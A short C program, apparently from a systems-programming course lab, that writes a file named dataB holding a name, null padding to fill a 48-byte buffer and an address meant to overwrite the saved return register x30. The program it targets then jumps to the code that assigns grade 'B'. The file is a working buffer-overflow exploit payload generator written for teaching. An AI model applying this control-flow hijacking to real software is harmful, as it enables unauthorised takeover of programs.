/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include <string.h>

int main() {
    size_t i; /* index for the loop */
    FILE *psFile; /* file */
    unsigned long address = 0x400890; /* address of grade = 'B' */

    /* create and open file dataB */
    psFile = fopen("dataB", "w");

    /* put names into file */
    fprintf(psFile, "%c", 'N');
    fprintf(psFile, "%c", '&');
    fprintf(psFile, "%c", 'T');
    fprintf(psFile, "%c", '\0'); /* terminating null byte */

    /* fill remaining buffer */
    for (i = 0; i < (48 - 4); i++) {
        fprintf(psFile, "%c", '\0');
    }

    /* change x30 */
    fwrite(&address, sizeof(address), 1, psFile);
    return 0;
}
